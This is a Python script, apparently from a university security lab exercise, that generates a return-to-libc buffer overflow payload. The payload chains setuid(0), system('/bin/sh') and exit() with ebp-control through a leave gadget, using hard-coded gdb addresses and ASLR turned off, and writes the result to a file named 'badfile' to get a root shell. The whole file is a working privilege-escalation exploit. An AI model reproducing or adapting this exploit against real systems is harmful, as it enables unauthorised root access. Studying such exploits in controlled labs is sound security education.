#!/usr/bin/python3

"""
Program: shell_chain.py
Section 5: lab exercise

This program builds a buffer overflow string that can be used to obtain
a root shell. The following must be set:
sysctl -w kernel.randomize_va_space=0

It uses the Return-to-libc method to accomplish the task. I also uses
executing an additional function epilogue to get around the issue of
PLT-based library functions. Using the additional function epilogue
allows us to control the value of ebp such that we can jump a number of
bytes allowing for library function arguments.
"""

def tobytes(value):
    return (value).to_bytes(4, byteorder="little")


def main():
    leave_addr  = 0x080485df    # from gdb stackRope -> 'leave'
    setuid_addr = 0xb7eb9170    # from gdb stackRope
    system_addr = 0xb7e42da0    # from gdb stackRope
    exit_addr   = 0xb7e369d0    # from gdb stackRope
    sh_addr     = 0xbffffde9    # address of environment variable 
    foo_ebp     = 0xbfffed18    # foo ebp value
    next_ebp    = foo_ebp
    skip_ebp    = 32            # leave room for up to 4 arguments
    offset      = 40            # distance between buffer start and ebp

    # Pad the offset of overflow string with an arbitrary value.
    content = bytearray(0xaa for i in range(offset))

    # setuid(0)
    next_ebp += skip_ebp            # jump address + skip value
    content += tobytes(next_ebp)    # ebp address skip_ebp bytes away
    content += tobytes(setuid_addr) # old ebp popped by foo()->epilogue
    content += tobytes(leave_addr)  # return address field  
    content += tobytes(0)           # argument to setuid()
    content += bytearray(0xaa for i in range(skip_ebp - (4*4)))

    # system("/bin/sh")
    next_ebp += skip_ebp            # jump address + skip value
    content += tobytes(next_ebp)    # ebp address skip_ebp bytes away
    content += tobytes(system_addr) # old ebp popped by setuid()->epilogue
    content += tobytes(leave_addr)  # return address field
    content += tobytes(sh_addr)     # argument to system()
    content += bytearray(0xaa for i in range(skip_ebp - (4*4)))

    # Invoke exit() to exite gracefully at end.
    content += tobytes(0xffffffff)  # next ebp value never used
    content += tobytes(exit_addr)   # return address field

    # Write the string to a file.
    with open("badfile", "wb") as f:
        f.write(content)


if __name__ == "__main__":
    main()
